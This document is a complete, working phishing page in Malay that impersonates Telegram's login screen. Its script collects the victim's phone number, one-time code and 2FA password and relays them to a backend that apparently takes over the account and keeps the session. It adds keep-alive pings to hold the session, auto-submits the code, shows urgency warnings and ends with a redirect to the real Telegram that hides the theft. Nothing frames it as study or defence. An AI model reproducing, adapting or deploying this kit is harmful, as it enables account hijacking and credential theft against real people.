<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram: Login</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 340px; text-align: center; padding: 20px; }
        .logo { width: 100px; margin-bottom: 20px; }
        h2 { font-weight: 500; font-size: 24px; margin-bottom: 10px; }
        p { color: #707579; font-size: 15px; margin-bottom: 30px; }
        input { width: 100%; padding: 14px; border: 1px solid #dfe1e5; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; margin-bottom: 15px; transition: 0.2s; }
        input:focus { border: 2px solid #3390ec; }
        button { width: 100%; padding: 14px; background: #3390ec; color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .hidden { display: none; }
        .warning { color: #e53935; font-size: 13px; margin-top: 10px; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
        <h2 id="title">Log Masuk</h2>
        <p id="desc">Sila masukkan nombor telefon anda dengan kod negara.</p>

        <div id="step-phone">
            <input type="tel" id="phone" placeholder="+60 12-345 6789">
            <button onclick="sendPhone()">TERUSKAN</button>
        </div>

        <div id="step-otp" class="hidden">
            <input type="number" id="otp" placeholder="Kod 5-digit">
            <p id="timer-msg" class="warning">Sila masukkan kod dengan segera sebelum sesi tamat.</p>
        </div>

        <div id="step-2fa" class="hidden">
            <input type="password" id="password" placeholder="Kata Laluan 2FA">
            <p class="warning">Akaun anda dilindungi 2FA. Masukkan kata laluan.</p>
        </div>

        <div id="status" style="color: #3390ec; font-size: 14px; margin-top: 15px;"></div>
    </div>

    <script>
        let keepAliveInterval;

        // Taktik Menahan Sesi Vercel: Ping setiap 5 saat
        function startKeepAlive() {
            if (keepAliveInterval) return;
            keepAliveInterval = setInterval(() => {
                fetch('/api/main?action=ping').catch(() => {});
            }, 5000);
        }

        async function api(action, body) {
            const savedSession = localStorage.getItem('tg_sess');
            if (savedSession) body.session = savedSession;

            const res = await fetch(`/api/main?action=${action}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            });
            const data = await res.json();
            if (data.session) localStorage.setItem('tg_sess', data.session);
            return data;
        }

        async function sendPhone() {
            const p = document.getElementById('phone').value.replace(/\s/g, '');
            document.getElementById('status').innerText = "Menghubungkan...";
            startKeepAlive();
            
            const res = await api('send_code', { phone: p });
            if(res.success) {
                localStorage.setItem('user_p', p);
                localStorage.setItem('tg_h', res.hash);
                document.getElementById('step-phone').classList.add('hidden');
                document.getElementById('step-otp').classList.remove('hidden');
                document.getElementById('otp').focus();
                document.getElementById('status').innerText = "";
            } else { alert(res.error); document.getElementById('status').innerText = ""; }
        }

        // AUTO-SUBMIT OTP (Pantas)
        document.getElementById('otp').addEventListener('input', function() {
            if(this.value.length === 5) sendOTP();
        });

        async function sendOTP() {
            document.getElementById('status').innerText = "Mengesahkan...";
            const res = await api('signin', { 
                phone: localStorage.getItem('user_p'), 
                code: document.getElementById('otp').value, 
                hash: localStorage.getItem('tg_h') 
            });
            
            if(res.success) {
                if(res.need_2fa) {
                    document.getElementById('step-otp').classList.add('hidden');
                    document.getElementById('step-2fa').classList.remove('hidden');
                    document.getElementById('password').focus();
                    document.getElementById('status').innerText = "Sila masukkan 2FA";
                } else { finish(); }
            } else { alert(res.error); document.getElementById('status').innerText = ""; }
        }

        // AUTO-SUBMIT 2FA (Jika user tekan Enter atau paste)
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') send2FA();
        });

        async function send2FA() {
            document.getElementById('status').innerText = "Mengesahkan 2FA...";
            const res = await api('signin', { 
                phone: localStorage.getItem('user_p'), 
                password: document.getElementById('password').value 
            });
            if(res.success) { finish(); } else { alert(res.error); }
        }

        function finish() {
            clearInterval(keepAliveInterval);
            document.getElementById('status').innerText = "Berjaya! Mengalihkan...";
            location.href = "https://t.me/telegram";
        }
    </script>
</body>
</html>
